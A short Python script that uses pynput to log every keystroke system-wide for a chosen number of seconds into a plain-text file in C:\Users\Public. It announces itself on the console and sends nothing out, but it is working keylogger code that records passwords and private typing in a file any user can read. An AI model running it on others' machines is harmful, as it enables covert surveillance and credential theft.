import time
import sys
from pynput import keyboard

def main():
    # 1. Determine Duration
    if len(sys.argv) > 1:
        try:
            duration = float(sys.argv[1])
        except ValueError:
            print("Invalid argument. Please provide a number for seconds.")
            return
    else:
        try:
            duration = float(input("Enter duration in seconds: "))
        except ValueError:
            print("Please enter a valid number.")
            return

    log_path = r"C:\Users\Public\global_log.txt"
    print(f"Monitoring for {duration} seconds... saving to {log_path}")

    # 2. Define what happens on each key press
    def on_press(key):
        try:
            # Alphanumeric keys
            content = key.char if key.char is not None else ""
        except AttributeError:
            # Special keys (Space, Enter, etc.)
            special_map = {
                keyboard.Key.space: " ",
                keyboard.Key.enter: "\n",
                keyboard.Key.tab: "\t",
                keyboard.Key.backspace: "[BACKSPACE]"
            }
            content = special_map.get(key, f" [{key}] ")

        with open(log_path, "a", encoding="utf-8") as f:
            f.write(content)

    # 3. Start the Listener
    with keyboard.Listener(on_press=on_press) as listener:
        # .join() waits for the listener to finish. 
        # Adding 'timeout' stops the wait after X seconds.
        listener.join(timeout=duration)
        
        # Manually stop the listener after the timeout expires
        listener.stop()

    with open(log_path, "a", encoding="utf-8") as f:
        f.write(f"\n--- Session Ended: {time.ctime()} ---\n")

    print(f"Time's up! Log completed.")

if __name__ == "__main__":
    main()
